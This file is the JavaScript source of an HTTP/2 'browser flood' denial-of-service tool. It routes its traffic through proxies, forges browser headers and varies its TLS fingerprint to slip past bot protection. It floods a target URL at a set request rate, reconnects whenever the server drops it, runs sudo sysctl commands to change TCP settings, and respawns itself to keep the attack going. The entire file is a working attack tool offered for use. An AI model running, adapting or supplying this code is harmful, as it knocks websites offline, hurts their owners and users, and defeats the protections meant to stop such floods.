// code created by @no_saving please credit him, all rights reserved : @no_saving
// remake @justcallNckx
// please don't delete !! Thanks for using <3

const url = require('url')
    , http2 = require('http2')
    , http = require('http')
    , tls = require('tls')
const crypto = require('crypto');
const currentTime = new Date();
const os = require("os");
const errorHandler = error => {
console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
    let colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}
const secureOptionsList = [
  crypto.constants.SSL_OP_NO_RENEGOTIATION,
  crypto.constants.SSL_OP_NO_TICKET,
  crypto.constants.SSL_OP_NO_SSLv2,
  crypto.constants.SSL_OP_NO_SSLv3,
  crypto.constants.SSL_OP_NO_COMPRESSION,
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
  crypto.constants.SSL_OP_TLSEXT_PADDING,
  crypto.constants.SSL_OP_ALL
];
cplist = [
        'TLS_AES_128_CCM_8_SHA256',
        'TLS_AES_128_CCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_AES_128_GCM_SHA256'
        , ]
        const sigalgs = [
            "ecdsa_secp256r1_sha256",
            "rsa_pss_rsae_sha256",
            "rsa_pkcs1_sha256",
            "ecdsa_secp384r1_sha384",
            "rsa_pss_rsae_sha384",
            "rsa_pkcs1_sha384",
            "rsa_pss_rsae_sha512",
            "rsa_pkcs1_sha512",
          ];
          let concu = sigalgs.join(':');
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
    , ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
    , ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    } ,
    sigalgs() {
        return sigalgs[Math.floor(Math.random() * sigalgs.length)];
      }
, }

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
    const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
    const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
    const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
    const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
    return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
let proxyFile = process.argv[5];
const rps = process.argv[6];
const validkey = process.argv[9]
let parsed = url.parse(target);

let input = 'bypass';
let query = 'false';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
console.log("STRSTRING")
    process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
    console.error('sent with http:// or https://');
    process.exit(1);
}
// Parse proxy list
proxyr = proxyFile
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
    console.error('number rps');
    process.exit(1);
}
function generateRandomString(minLength, maxLength) {
                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const argsa = process.argv.slice(2);
const queryIndexa = argsa.indexOf('--post');
post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
const argsb = process.argv.slice(2);
const queryIndexg = argsb.indexOf('--query');
query = queryIndexg !== -1 ? argsb[queryIndexg + 1] : null;
const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const argstco = process.argv.slice(2);
const queryIndextco = argstco.indexOf('--cookie');
cookies = queryIndextco !== -1 ? argstco[queryIndextco + 1] : null;
let cookie 
if (cookies=== 'true'){
cookie = process.argv[7] + "; " + generateRandomString(5,10) + "=" + generateRandomString(30,150)
}else{
cookie = process.argv[7] 
}
let method, path;
if (parsed.path.includes('%rand%')) {
    pathl = parsed.path.replace("%rand%", generateRandomString(5, 7))
    if (query === 'true') {
        path = pathl + generateRandomString(5, 10) 
    } else if (query === "query") {
        path = pathl + "?" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
} else {
    pathl = parsed.path
    if (query === 'true') {
        path = pathl+ generateRandomString(5, 10) 
    } else if (query === "query") {
        path = pathl + "?" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
}

if (post === 'true') {
    method = {
        ":method": "POST",
        "content-length": "0"
    };
} else if (post === 'random') {
    method = {
        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)],
    }
} else {
    method = {
        ":method": "GET",
    }
}
const statusCounts = {};

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

const printStatusCounts = () => {
    console.log(statusCounts);
    Object.keys(statusCounts).forEach(status => {
        statusCounts[status] = 0;
    });
};

const { exec } = require('child_process');

function getRandomOption(options) {
    return options[Math.floor(Math.random() * options.length)];
}

function generateTCPConfiguration() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    return {
        congestionControl: getRandomOption(congestionControlOptions),
        sack: getRandomOption(sackOptions),
        windowScaling: getRandomOption(windowScalingOptions),
        timestamps: getRandomOption(timestampsOptions),
        tcpFastOpen: getRandomOption(tcpFastOpenOptions),
    };
}

function applyTCPConfiguration(config) {
    const command = `sudo sysctl -w \
net.ipv4.tcp_congestion_control=${config.congestionControl} \
net.ipv4.tcp_sack=${config.sack} \
net.ipv4.tcp_window_scaling=${config.windowScaling} \
net.ipv4.tcp_timestamps=${config.timestamps} \
net.ipv4.tcp_fastopen=${config.tcpFastOpen}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error applying TCP configuration: ${error.message}`);
            return;
        }
        if (stderr) {
            console.warn(`Warning: ${stderr}`);
        }
        console.log(`TCP configuration applied successfully:\n${stdout}`);
    });
}

function TCP_CHANGES() {
    const config = generateTCPConfiguration();
    console.log('Generated TCP Configuration:', config);
    applyTCPConfiguration(config);
}


function response(res){
    const status = res[':status']
    countStatus(status)
}
if (tos === 'true'){
    setInterval(printStatusCounts, 3000);
    }


    function flood(proxy) {
        try {
          let parsed = url.parse(target);
          let sigals = headerFunc.sigalgs();
      
          let interval;
          if (input === 'flood') {
            interval = 1000;
          } else if (input === 'bypass') {
            function randomDelay(min, max) {
              return Math.floor(Math.random() * (max - min + 1)) + min;
            }
            interval = randomDelay(100, 1000);
          } else {
            interval = 1000;
          }
      
          function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
              return match[1];
            }
            return null;
          }
      
          function getFirefoxVersion(userAgent) {
            if (!userAgent || typeof userAgent !== "string") {
              throw new Error("User-Agent không h?p l?!");
            }
            const firefoxVersionRegex = /(?:rv:|Firefox\/)([\d.]+)/;
            const match = userAgent.match(firefoxVersionRegex);
            return match ? match[1] : null;
          }
      
          const chromever = getFirefoxVersion(process.argv[8]);
          const randValue = list => list[Math.floor(Math.random() * list.length)];
          const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9",
            "ur-IN,ur;q=0.9", "ro-RO,ro;q=0.9", "bg-BG,bg;q=0.9", "hr-HR,hr;q=0.9", "sk-SK,sk;q=0.9",
            "sl-SI,sl;q=0.9", "sr-RS,sr;q=0.9", "uk-UA,uk;q=0.9", "et-EE,et;q=0.9", "lv-LV,lv;q=0.9",
            "lt-LT,lt;q=0.9", "ms-MY,ms;q=0.9", "fil-PH,fil;q=0.9", "zh-TW,zh;q=0.9", "es-AR,es;q=0.9",
            "en,en-US;q=0.9", "en,en-GB;q=0.9", "en,fr-FR;q=0.9", "en,de;q=0.9", "en,it;q=0.9",
            "en,fr-CA;q=0.9", "vi,fr-FR;q=0.9", "en,tr;q=0.9", "en,ru;q=0.9", "fr-CH,fr;q=0.9",
            "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9",
            "en-IN,en;q=0.9", "ca-ES,ca;q=0.9", "cy-GB,cy;q=0.9", "eu-ES,eu;q=0.9", "gl-ES,gl;q=0.9",
            "gu-IN,gu;q=0.9", "kn-IN,kn;q=0.9", "ml-IN,ml;q=0.9", "mr-IN,mr;q=0.9", "nb-NO,nb;q=0.9",
            "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9",
            "te-IN,te;q=0.9", "zh-HK,zh;q=0.9"
          ];
      
          let fixed = {
            ...method,
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": process.argv[8],
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "FireFox";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
              "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
              "purpure-secretf-id": "formula-" + generateRandomString(1, 2)
            }),
            "priority": "u=0, i",
            "te": "trailers"
          };
      
          let randomHeaders = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(1, 2)]: "root-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["Java-x-seft" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { [generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {})
          };
      
          let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "purpure-secretf-id",
            "priority"
          ];
      
          let headersArray = Object.entries(fixed);
          let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);
      
          shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, v]) => k === insertAfter);
            if (index !== -1) {
              headersArray.splice(index + 1, 0, [key, value]);
            }
          });
      
          let dynHeaders = Object.fromEntries(headersArray);
      
          const regexPattern = /^([\w.-]+):(\w+)@([\w.-]+):(\d+)$/;
          const match = proxy.match(regexPattern);
          let connection;
          if (match) {
            const agent = new http.Agent({
              host: match[3],
              port: match[4],
              keepAlive: true,
              keepAliveMsecs: 500000000,
              maxSockets: 50000,
              maxTotalSockets: 100000
            });
            const Optionsreq = {
              agent: agent,
              method: "CONNECT",
              path: parsed.host + ":443",
              timeout: 1000,
              headers: {
                Host: parsed.host,
                "Proxy-Connection": "Keep-Alive",
                Connection: "Keep-Alive",
                "Proxy-Authorization": "Basic " + Buffer.from(match[1] + ":" + match[2]).toString("base64")
              }
            };
            connection = http.request(Optionsreq, (res) => {});
          } else {
            proxy = process.argv[5].split(":");
            const agent = new http.Agent({
              host: proxy[0],
              port: proxy[1],
              keepAlive: true,
              keepAliveMsecs: 500000000,
              maxSockets: 50000,
              maxTotalSockets: 100000
            });
            const Optionsreq = {
              agent: agent,
              method: "CONNECT",
              path: parsed.host + ":443",
              timeout: 1000,
              headers: {
                Host: parsed.host,
                "Proxy-Connection": "Keep-Alive",
                Connection: "Keep-Alive"
              }
            };
            connection = http.request(Optionsreq, (res) => {});
          }
      
          function createCustomTLSSocket(parsed, socket) {
            const tlsSocket = tls.connect({
              host: parsed.host,
              port: 443,
              servername: parsed.host,
              socket: socket,
              minVersion: "TLSv1.2",
              maxVersion: "TLSv1.3",
              ALPNProtocols: ["h2"],
              rejectUnauthorized: false,
              sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
              ecdhCurve: "X25519:P-256:P-384",
              ...(Math.random() < 0.5
                ? { secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] }
                : {})
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000);
            return tlsSocket;
          }
      
          connection.on("connect", async function (res, socket) {
            const tlsSocket = createCustomTLSSocket(parsed, socket);
            const client = http2.connect(parsed.href, {
              createConnection: () => tlsSocket,
              settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
              }
            }, (session) => {
              session.setLocalWindowSize(12517377 + 65535);
            });
      
            client.on("connect", () => {
              let clearr = setInterval(async () => {
                for (let i = 0; i < rps; i++) {
                  const request = client.request({ ...dynHeaders }, {
                    weight: Math.random() < 0.5 ? 42 : 256,
                    depends_on: 0,
                    exclusive: false
                  });
      
                  request.on("response", (res) => {
                    if (tos === "true") {
                      response(res);
                    }
                    if (res[":status"] === 429) {
                      interval = 20000;
                      client.close();
                    }
                  });
                  request.end();
                }
              }, interval);
      
              let goawayCount = 0;

                client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                console.log(`Received GOAWAY: errorCode=${errorCode}, lastStreamID=${lastStreamID}`);

                let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);

                
                setTimeout(() => {
                    goawayCount++;
                    client.destroy();
                    tlsSocket.destroy();
                    socket.destroy();
                    flood(proxy);
                }, backoff);
                });
      
              client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
                return flood(proxy);
              });
      
              client.on("error", (error) => {
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
                return flood(proxy);
              });
            });
          });
      
          connection.on("error", (error) => {
            connection.destroy();
            if (error) return;
          });
          connection.on("timeout", () => {
            connection.destroy();
            return;
          });
          connection.end();
        } catch (err) {
          console.log(err);
        }
      }

      
let intervalId;

const valid = () => setInterval(function() {
    flood(proxyr);
}, 10);
setInterval(() => {
    TCP_CHANGES();
}, 5000);
intervalId = valid();
let intervalId2
setInterval(() => {
    clearInterval(intervalId);
    clearInterval(intervalId2);
    intervalId = valid();
    intervalId2 = valid();
}, 10000);
const {
    spawn
} = require('child_process');

const MAX_RAM_PERCENTAGE = 40;

function Seconds() {
    const currentTime = Date.now();
    const elapsedTimeInSeconds = Math.floor((currentTime - startTime) / 1000);
    const remainingSeconds = Math.max(time - elapsedTimeInSeconds, 0);
    return remainingSeconds;
}

const startTime = Date.now();

const restartScript = (timereset) => {
    //console.log('[>] Restarting...');
    process.argv[3] = timereset
    //console.log(timereset)
    const child = spawn(process.argv[0], process.argv.slice(1), {
        detached: true,
        stdio: 'ignore'
    });
    child.unref();
    process.exit();
};

const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    const endtime = Seconds()
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        // console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
        restartScript(endtime);
    }
};

const Script = () => {
    const child = spawn('pkill', ['-f', validkey]);
    child.on('close', (code, signal) => {
        console.log(`Child process terminated with code ${code} and signal ${signal}`);
        process.exit();
    });
};

process.on('SIGINT', () => {
    console.log('Received SIGINT. Exiting...');
    Script();
    process.exit(0);
});

setInterval(handleRAMUsage, 1000);
console.log("SATAR BROWSER FLOOD");

setTimeout(function() {
    console.log("Attack stopped.");
    Script();
    process.exit(1);
}, time * 1000);